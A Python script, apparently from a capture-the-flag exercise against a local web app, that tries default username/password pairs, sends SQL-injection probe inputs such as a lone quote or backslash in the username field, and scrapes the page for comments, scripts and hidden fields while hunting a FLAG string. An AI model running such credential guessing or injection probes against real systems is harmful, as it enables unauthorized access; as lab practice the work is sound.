import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[*] Comprehensive testing of authentication\n")

# Test common credentials
print("[1] Testing common credentials:")
test_creds = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("root", "root"),
    ("administrator", "administrator"),
]

for username, password in test_creds:
    r = requests.get(target, params={'username': username, 'password': password})
    print(f"  {username}/{password}: ", end="")
    
    if 'FLAG{' in r.text:
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f"[!!!] FLAG FOUND: {flags[0]}")
        print(f"\nFull response:\n{r.text}\n")
        break
    elif 'not the admin' not in r.text:
        print("[DIFFERENT!]")
        print(f"    Response:\n{r.text[:300]}\n")
    else:
        print("Standard 'not the admin' response")

print("\n[2] Checking if the application processes SQL in username field:")
# The fact that all responses are identical suggests input might be escaped
# BUT context says ORDER BY works, so let's verify if there's actually SQLi

# Direct check: Does the app show different behavior for syntax errors?
syntax_tests = [
    ("admin'", "Should cause SQL syntax error"),
    ("admin''", "Escaped quote"),
    ("admin\\", "Backslash"),
    ("admin`", "Backtick"),
]

for payload, desc in syntax_tests:
    r = requests.get(target, params={'username': payload, 'password': 'x'})
    print(f"  [{desc}] '{payload}': Length={len(r.text)}")
    if len(r.text) != 3173:
        print(f"    [!] Different length!")
        print(f"    Response snippet:\n{r.text[:300]}\n")

# Final attempt: Maybe the page source or JavaScript contains hints
print("\n[3] Checking page source for hidden clues:")
r = requests.get(target)
# Look for comments, hidden fields, JavaScript
if '<!--' in r.text:
    comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
    print(f"  Found {len(comments)} HTML comments")
    for i, comment in enumerate(comments):
        print(f"    Comment {i+1}: {comment.strip()}")

if '<script' in r.text:
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
    print(f"  Found {len(scripts)} script tags")
    for i, script in enumerate(scripts):
        if script.strip():
            print(f"    Script {i+1}: {script[:200]}")

# Check for hidden form fields
hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', r.text)
if hidden:
    print(f"  Found {len(hidden)} hidden inputs:")
    for h in hidden:
        print(f"    {h}")

